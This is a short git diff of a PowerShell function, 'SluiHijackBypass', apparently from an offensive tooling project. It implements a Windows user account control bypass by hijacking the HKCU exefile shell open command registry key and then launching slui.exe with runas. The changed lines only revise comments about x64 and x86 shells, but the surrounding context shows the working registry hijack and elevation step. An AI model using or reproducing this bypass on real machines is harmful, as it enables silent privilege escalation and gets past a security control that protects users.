@@ -27,10 +27,10 @@ function SluiHijackBypass(){
 	Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $program -Force
 
 	#Perform the bypass
-		#In Windows x64
+		#x64 shell in Windows x64 | x86 shell in Windows x86
 		Start-Process "C:\Windows\System32\slui.exe" -Verb runas
 
-		#In Windows x86
+		#x86 shell in Windows x64
 		#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\slui.exe -Verb runas"
 
 	#Remove registry structure
